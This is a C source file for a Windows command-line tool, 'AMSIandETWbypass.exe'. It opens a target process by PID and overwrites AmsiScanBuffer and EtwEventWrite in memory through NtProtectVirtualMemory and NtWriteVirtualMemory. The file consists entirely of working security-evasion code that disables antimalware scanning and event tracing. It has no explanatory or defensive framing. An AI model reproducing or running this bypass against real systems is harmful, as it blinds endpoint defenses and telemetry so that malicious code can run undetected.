#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);



typedef void* (*tNtVirtual) (HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
tNtVirtual oNtVirtual;


void disableETW(HANDLE& hProc) {
    void* etwAddr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");

    char etwPatch[] = { 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* etwAddr_bk = etwAddr;
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    printf("\n\n[+] Patched etw!\n\n");
}


void patchAMSI(HANDLE& hProc) {
    void* AMSIaddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    char amsiPatch[100];
    lstrcatA(amsiPatch, "\x31\xC0\x05\x4E\xFE\xFD\x7D\x05\x09\x02\x09\x02\xC3");
    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    void* ptrAMSIaddr = AMSIaddr;



    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        return;
    }
    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hProc, (LPVOID)AMSIaddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    if (!NT_SUCCESS(NtWriteStatus)) {
        return;
    }
    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus2)) {
        return;
    }

    printf("\n\n[+] AmsiScanBuffer is Patched!\n\n");
}


int main(int argc, char** argv) {

    HANDLE hProc;

    if (argc < 2) {
        printf("USAGE: AMSIandETWbypass.exe <PID>\n");
        return 1;
    }

    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
    if (!hProc) {
        printf("OpenProcess Error (%u)\n", GetLastError());
        return 2;
    }

    patchAMSI(hProc);
    disableETW(hProc);

    return 0;

}